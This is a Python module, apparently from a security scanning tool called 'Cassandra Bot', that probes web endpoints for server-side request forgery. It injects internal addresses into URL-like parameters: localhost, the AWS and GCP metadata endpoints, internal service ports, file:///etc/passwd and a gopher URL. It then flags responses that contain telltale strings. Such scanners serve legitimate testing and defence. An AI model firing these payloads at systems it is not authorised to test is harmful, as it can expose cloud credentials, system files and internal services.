"""Cassandra Bot — SSRF (Server-Side Request Forgery) 스캐너."""
import httpx
from core.models import Asset, Endpoint, Finding
from core.logger import get_logger

log = get_logger("scanner.ssrf")

SSRF_PAYLOADS = [
    ("http://127.0.0.1", "localhost"),
    ("http://localhost", "localhost-name"),
    ("http://169.254.169.254/latest/meta-data/", "aws-metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "gcp-metadata"),
    ("http://0.0.0.0", "null-ip"),
    ("http://[::1]", "ipv6-localhost"),
    ("http://127.0.0.1:22", "ssh-port"),
    ("http://127.0.0.1:3306", "mysql-port"),
    ("http://127.0.0.1:6379", "redis-port"),
    ("file:///etc/passwd", "file-protocol"),
    ("gopher://127.0.0.1:25/_", "gopher-protocol"),
]

SSRF_INDICATORS = [
    "meta-data",
    "ami-id",
    "instance-id",
    "root:",
    "SSH-2.0",
    "MySQL",
    "Redis",
    "HTTP/1.1 200",
]


def scan_ssrf(asset: Asset, endpoint: Endpoint, client: httpx.Client) -> list[Finding]:
    """SSRF 스캔: URL 파라미터에 내부 주소 주입, 응답 분석."""
    findings = []
    if not endpoint.params:
        return findings

    base_url = endpoint.url or asset.base_url

    # Find URL-like parameters
    url_params = []
    for param in endpoint.params:
        if param.lower() in ("url", "uri", "link", "redirect", "callback", "next", "return", "src", "source", "image", "img", "fetch", "load", "target", "dest", "destination", "host", "domain"):
            url_params.append(param)

    if not url_params:
        return findings

    for param in url_params:
        for payload, technique in SSRF_PAYLOADS:
            params = {param: payload}
            resp = _request(client, base_url, endpoint.method, params)
            if resp is None:
                continue

            body = resp.text.lower()
            for indicator in SSRF_INDICATORS:
                if indicator.lower() in body:
                    finding = Finding(
                        asset_id=asset.id,
                        vuln_type="ssrf",
                        severity="high",
                        endpoint=base_url,
                        method=endpoint.method,
                        evidence=f"SSRF: param '{param}'='{payload}' returned indicator '{indicator}' (technique: {technique})",
                        poc_request={
                            "method": endpoint.method,
                            "url": base_url,
                            "params": params,
                        },
                        raw_data={"param": param, "payload": payload, "technique": technique, "status": resp.status_code},
                    )
                    findings.append(finding)
                    break

    log.info("ssrf: %d findings on %s", len(findings), base_url)
    return findings


def _request(client: httpx.Client, url: str, method: str, params: dict) -> httpx.Response | None:
    try:
        if method.upper() == "GET":
            return client.get(url, params=params, timeout=10)
        elif method.upper() == "POST":
            return client.post(url, data=params, timeout=10)
        return client.get(url, params=params, timeout=10)
    except Exception as e:
        log.debug("request failed: %s %s: %s", method, url, e)
        return None
